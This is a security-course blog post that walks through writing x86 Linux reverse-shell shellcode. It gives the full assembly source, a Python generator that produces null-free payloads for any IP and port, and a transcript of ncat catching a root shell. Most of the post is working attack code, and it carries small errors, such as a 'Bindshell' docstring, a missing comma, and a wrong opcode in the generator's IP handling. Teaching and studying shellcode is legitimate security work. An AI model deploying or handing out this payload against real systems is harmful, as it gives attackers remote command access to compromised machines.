---
layout: post
title: Linux TCP Reverse Shell (x86)
---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

*http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*

*Student ID: SLAE - 1187*

*[ASM Source Code for this exercise](https://github.com/fbcsec/slae-assignments/blob/master/2-tcp-reverse-shell/tcp-reverse-shell.asm)*

*[Python wrapper for shellcode](https://github.com/fbcsec/slae-assignments/blob/master/2-tcp-reverse-shell/tcp-reverse-shell-wrapper.py)*

Introduction
============

Today we'll be writing a simple TCP reverse shell payload for Linux. This work builds on my previous article on [Linux Bind Shells]({% post_url 2018-05-05-Linux-TCP-Bind-Shell %}), and in order to fully understand what's going on here you are encouraged to go back and read through it first. 

Please refer to the Linux Bind Shells post for information on building and testing the shellcode detailed here. 



Linux Reverse Shells
====================

A reverse shell is very similar to a bind shell with one key difference. Instead of listening for connections on a port on the machine we've compromised, our code will connect back to a server that we control and present a command shell over that connection. This resolves one of the most blatant issues with bind shells - you need to be able to listen for and accept a connection. A bind shell has a serious obstacle to overcome in the form of firewalls and NAT (network address translation). Firewalls are at a basic level for preventing connections to machines behind it on ports that are not approved. On the other hand NAT, while not a security mechanism, requires configuration for each port that is to be connectible. Reverse shells defeat these issues by opening a connection outward instead of waiting for a connection inward. Host based and network based firewalls are generally much more lenient about outgoing connections than incoming ones. NAT also stops being a concern as NAT is usually set up to allow arbitrary outgoing connections from internal hosts. 

As noted before our reverse shell shellcode is going to be very similar to our bind shell, except we will be making a `connect(2)` call to a destination of our choice and `execve(2)` our shell.

1. Make a `socket(2)` call to make a new socket to use for our connection. 
2. Make a `connect(2)` call to initiate a connection to our destination. Because we only get one chance to make and accept this connection, I call it 'throwing the shell'.
3. Receive the connection using a listener of some kind, my favorite is `ncat`. This I call 'catching the shell'.
4. With the established connection, duplicate stdin, stdout, and stderr to the file handle returned by `socket(2)` using `dup2(2)` in a loop. 
5. Execute a command shell using `execve(2)`.

As you can see this is slightly less complex than the bind shell as we only need to concern ourselves with calling `connect(2)`, no `accept(2)` or `listen(2)`. This also results in a slightly smaller payload. 

### Starting Off

```nasm
 _start:

    xor ebx, ebx
    mul ebx

; socket(AF_INET, SOCK_STREAM, 0)
    push eax
    inc ebx
    push ebx
    push byte 0x02
    mov ecx, esp
    mov al, 0x66
    int 0x80
; A file descriptor for this socket is returned in EAX.
```

This portion of code is identical to the bind shell payload. We need to clean out some registers and make an initial call to `socket(2)` to get a file descriptor to do our business with. This file handle will stick with us to the end, as opposed to the bind shell code which would have us exchange the initial file descriptor for a new one when we `accept(2)` a connection. 

### Using `connect(2)` to Connect... Somewhere!

To make a connection is simple. The arguments for `connect(2)` are identical to `bind(2)`, but have a different purpose. We need a file descriptor to use (i.e. the one from `socket(2)`), a pointer to a `sockaddr` structure, and the size of the `sockaddr` structure. The `sockaddr` structure consists of two bytes of protocol domain, two bytes of destination port, and four bytes of destination ip address.

```nasm
    pop edi      
    xchg edi, eax
    xchg ebx, eax
    mov al, 0x66 
```

Before we do anything, we perform the same register cleanup as the one before `bind(2)` in the bind shell payload. Again, this is due to the unpredictability of the file descriptor we are returned from `socket(2)`.

#### Note on IP addresses

You probably understand an IPv4 address in this format: `172.16.1.5`. This is known as 'dotted decimal notation'. It is composed of four 'octets', which are decimal numbers between 0 and 255, separated by periods. Network stacks do not use this internally, instead under normal circumstances this `172.16.1.5` string is converted to a 32 bit integer in network byte order (big endian) using a function like the C standard library's `inet_aton(3)`. In this case the integer representation of the IP address I've chosen is `2886729989`, which in network byte order hexadecimal is `0xAC100105`. The most important thing to notice is that what the dots really separate are the bytes of the address.

To illustrate this:

```
172 .16 . 1  .5

 AC .10 .01 .05

0xAC100105
```

#### Building the `sockaddr` Structure

```nasm
    push 0x050110ac         ; 4 byte IP address
    push word 0x5c11        ; 2 byte Port number
    push word bx            ; 2 byte protocol domain (bx should always be 0x0002 at this point)
```

Building the `sockaddr` struct is straightforward when dealing with a destination IP address that contains no zeros. We simply take the hexadecimal form of our desired destination IP address, reverse it so that when it gets pushed it goes onto the stack the IP address comes out in network byte order, and finally push the port and protocol domain. 

##### Dealing with null bytes

If the IP address you need to connect back to contains zeroes (i.e. `10.0.0.5`, which is `0xA0000005` in hex) we need to handle it similarly to the port numbers with nulls in my bind shell article. I recommend (and what I implement in my wrapper) is to split the IP address into two separate PUSH WORD instructions constructing the IP address. 

For example, to get `10.0.0.5` onto the stack we'd do the following:

```nasm
    add dh, 0x05
    push word dx
    xor edx edx
    add dl, 0xa
    push word dx
    xor edx edx
```

This will result in this dword being on the stack: `0x0500000a`, when we examine a pointer to it byte by byte it is read as `0x0a, 0x00, 0x00, 0x05`, our correctly formatted destination IP address. This is similar to how we got a port with a null byte into our struct in the bind shell payload. These are the types of instructions that are generated by my wrapper script to handle these nulls. 

##### Finishing up `sockaddr`
```nasm
    inc ebx         
    mov ecx, esp    
```

With these last instructions we have incremented EBX to the correct id to call `connect(2)` with `socketcall(2)`. We also have moved into ECX a pointer to the `sockaddr` struct we created.

#### Finishing up `connect(2)`

```nasm
    push 0x10
    push ecx
    push edi
    mov ecx, esp
    int 0x80
```

These next instructions set up the arguments to `connect(2)`. As usual these get pushed in reverse order, first the length of the sockaddr struct (`0x10`, or 16), then the pointer to the sockaddr struct we saved earlier into ecx, and finally `0x02`, the protocol domain saved in EDI. 

Then we move the pointer to these arguments into ECX and make the syscall. 

### The Rest of the Shellcode

There is one last change to make before we return to the same code as is in the bind shell payload. Since we're using the same file descriptor returned by `socket(2)` to handle the connection we need to get it back off the stack before proceeding. 

This is a simple POP EBX

```nasm
    pop ebx
```

From here on out the code is identical to the bind shell payload. 

```nasm
; dup2(connection_fd, fd_to_redirect)

    mov ecx, edx        ; from here on out it's identical to our previous bindshell payload.
    mov cl, 0x02

dup2_loop:
    xor eax, eax
    mov al, 0x3f
    int 0x80
    dec ecx
    jns dup2_loop

; execve /bin/sh

    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0x0b
    int 0x80
```

In a short loop we run `dup2(2)` to duplicate our stdin, stdout, and stderr to the socket file descriptor, and then use `execve(2)` to invoke `/bin/sh`. 

Final Thoughts
==============

When running this shellcode we need to receive the confection in some way. The most straightforward way is to use `ncat` as a server. Ensure that the port is open and un-firewalled on your local machine and simply run `ncat -lv <listening_port>`. Of course the listening port must be the same as the destination port configured in the shellcode. `ncat` is available in the `nmap` package in Debian Linux repositories. 

```
# ncat -lv 4444
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 483B 236A 0F4A 2EFD B856 3731 A417 5106 1B43 3456
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.1.127.
Ncat: Connection from 172.16.1.127:55862.
id
uid=0(root) gid=0(root) groups=0(root)
```

When we execute the payload on our target it will connect back to us and we'll have our shell. 

### Full Source
**[ASM source on Github](https://github.com/fbcsec/slae-assignments/blob/master/2-tcp-reverse-shell/tcp-reverse-shell.asm)**

```nasm
; Simple x86 Linux TCP Reverse Shell
; Author: @fbcsec
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:

    xor ebx, ebx
    mul ebx

; socket(AF_INET, SOCK_STREAM, 0)
    push eax
    inc ebx
    push ebx
    push byte 0x02
    mov ecx, esp
    mov al, 0x66
    int 0x80
; A file descriptor for this socket is returned in EAX.

; connect(fd, *sockaddr, addrlen (0x10))


    pop edi             ; EDI is now 0x02
    xchg edi, eax       ; sockfd is now in edi
    xchg ebx, eax       ; EAX now contains 0x00000002 (all but al is zero)
    mov al, 0x66        ; EAX now contains 0x00000066
                        ; This block is because we can't predict the file descriptor returned in EAX and must ensure all of EAX's bytes higher than AL are zeroed.


; Now we build a sockaddr struct representing the IP address and port we want to connect back to.

    push 0x050110ac  ; Push destination IP address, in this case 172.16.1.5

        ; If you need to connect back to an IP with a null byte in it (i.e. one of the octets is zero, such as 10.0.0.5) we need to do extra legwork to push the IP address

        ; for example to use 10.0.0.5:
        ;   add dh, 0x05
        ;   push word dx
        ;   xor edx edx
        ;   add dl, 0xa
        ;   push word dx
        ;   xor edx edx

        ; This will result in this dword being on the stack: 0x0500000a, when we examine a pointer to it byte by byte it is read as 0x0a, 0x00, 0x00, 0x05, our destination IP address.

    push word 0x5c11 ; push port number
    push word bx     ; push 0x02

    inc ebx          ; connect(2)'s socket call id is 3, so we bump ebx up one.
    mov ecx, esp     ; save address to struct in ecx


; And now set up the connect(2) socketcall. Its arguments are identical to bind(2) from our bind shell.
    push 0x10
    push ecx
    push edi
    mov ecx, esp
    int 0x80

; This should return zero, we will continue using the file descriptor from our initial socket(2) call.


; dup2(connection_fd, fd_to_redirect)

    pop ebx             ; A new file descriptor is not returned so must POP the one we've got initially off the stack.
    mov ecx, edx        ; from here on out it's identical to our previous bindshell payload.
    mov cl, 0x02

dup2_loop:
    xor eax, eax
    mov al, 0x3f
    int 0x80
    dec ecx
    jns dup2_loop

; execve /bin/sh

    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0x0b
    int 0x80
```

### Wrapper Script
*[Wrapper on Github](https://github.com/fbcsec/slae-assignments/blob/master/2-tcp-reverse-shell/tcp-reverse-shell-wrapper.py)*

```python
#!/usr/bin/env python3
"""
x86 Linux TCP Bindshell Generator
Handles portnumbers and destination IPs which have NULs in their hex representation
Usage: this_script.py <ip> <port>
Author: fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""
from sys import argv

from socket import inet_aton


def generate_ip_shellcode(ip_half):

    rv = ''

    if ip_half == '0000':
        rv = "\x66\x52"   # push word dx

        return rv

    if ip_half[0:2] == '00':
        rv = ("\x80\xc6" +  # add dh <ip half low bytes>
              bytearray.fromhex(ip_half[2:4]).decode('iso8859-1') +
              "\x66\x52" +  # push word dx
              "\x31\xd2")   # xor edx, edx
        return rv
    elif ip_half[2:4] == '00':
        rv = ("\x80\xc2" +  # add dl <ip half high bytes>
              bytearray.fromhex(ip_half[0:2]).decode('iso8859-1') +
              "\x66\x52" +  # push word dx
              "\x31\xd2")   # xor edx, edx
        return rv
    else:
        rv = ("\x66\x83" +  # push word <ip_half>
              bytearray.fromhex(ip_half).decode('iso-8859-1'))
        return rv

if len(argv) != 3:
    print('Usage: %s <ip_to_connect_to> <port>')
    raise SystemExit

ip = argv[1]
port = int(argv[2])

if port > 65535:
    print('ERROR: Port number cannot be greater than 65535.')
    raise SystemExit

if port == 0:
    print('ERROR: Port 0 is not usable.')
    raise SystemExit


hexip = "{0:#0{1}x}".format(int.from_bytes(inet_aton(ip), 'big'), 10)

#
HANDLE_IP_ADDRESS = None

if (hexip[2:4] == '00'
    or hexip[4:6] == '00'
    or hexip[6:8] == '00'
    or hexip[8:10] == '00'):
    HANDLE_IP_HIGH = generate_ip_shellcode(hexip[6:10])
    HANDLE_IP_LOW = generate_ip_shellcode(hexip[2:6])

    HANDLE_IP_ADDRESS = HANDLE_IP_HIGH + HANDLE_IP_LOW

else:
    HANDLE_IP_ADDRESS = "\x68" + bytearray.fromhex(hexip[2:]).decode('iso-8859-1')



# Port Number handling
# Zero padded port in hexadecimal
hexport = "{0:#0{1}x}".format(port, 6)

# If port is below 256
if hexport[2:4] == '00':
    HANDLE_PORT_NUMBER = ("\x80\xc6" +  # add dh <port number low bytes>
                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1') +
                          "\x66\x52" +  # push word dx
                          "\x31\xd2")  # xor edx, edx

elif hexport[4:6] == '00':
    HANDLE_PORT_NUMBER = ("\x80\xc2" +  # add dl <port number high bytes>
                          bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
                          "\x66\x52" +  # push word dx
                          "\x31\xd2")  # xor edx, edx
else:
    HANDLE_PORT_NUMBER = ("\x66\x68" +  # push word <big endian port number>
                          bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1'))

shellcode = bytearray("\x31\xdb"                # xor ebx, ebx 
                      "\xf7\xe3"                # mul ebx
                      "\x50"                    # push eax
                      "\x43"                    # inc ebx
                      "\x53"                    # push ebx
                      "\x6a\x02"                # push 0x02
                      "\x89\xe1"                # mov ecx, exp
                      "\xb0\x66"                # mov al, 0x66
                      "\xcd\x80"                # int 0x80
                      "\x5f"                    # pop edi
                      "\x97"                    # xchg edi, eax
                      "\x93"                    # xchg ebx, eax
                      "\xb0\x66" +              # mov al, 0x66
                      HANDLE_IP_ADDRESS +
                      HANDLE_PORT_NUMBER +
                      "\x66\x53"                # push word bx
                      "\x43"                    # inc ebx
                      "\x89\xe1"                # mov ecx, esp
                      "\x6a\x10"                # push 0x10
                      "\x51"                    # push ecx
                      "\x57"                    # push edi
                      "\x89\xe1"                # mov ecx, esp
                      "\xcd\x80"                # int 0x80
                      "\x5b"                    # pop ebx
                      "\x89\xd1"                # mov ecx, edx
                      "\xb1\x02"                # mov cl, 0x02
                      "\x31\xc0"                # <label dup2_loop:> xor eax, eax
                      "\xb0\x3f"                # mov al, 0x3f
                      "\xcd\x80"                # int 0x80
                      "\x49"                    # dec ecx
                      "\x79\xf7"                # JNS short <dup2_loop>
                      "\x52"                    # push edx
                      "\x68\x2f\x2f\x73\x68"    # push 0x68732f2f
                      "\x68\x2f\x62\x69\x6e"    # push 0x6e69622f </bin//sh>
                      "\x89\xe3"                # mov ebx, esp
                      "\x52"                    # push eds
                      "\x89\xe2"                # mov edx, esp
                      "\x53"                    # push edx
                      "\x89\xe1"                # mov ecx, esp
                      "\xb0\x0b"                # mov al, 0x0b
                      "\xcd\x80",               # int 0x80
                      'iso-8859-1')

final_shellcode = ''

for i in shellcode:
    final_shellcode += '\\x'
    final_shellcode += '%02x' % (i & 0xff)

print("x86 Linux TCP Reverse Shell on port " + str(port))
print("Length: " + str(len(shellcode)) + "\n")
print("unsigned char shellcode[] = \"" + final_shellcode + "\";")
```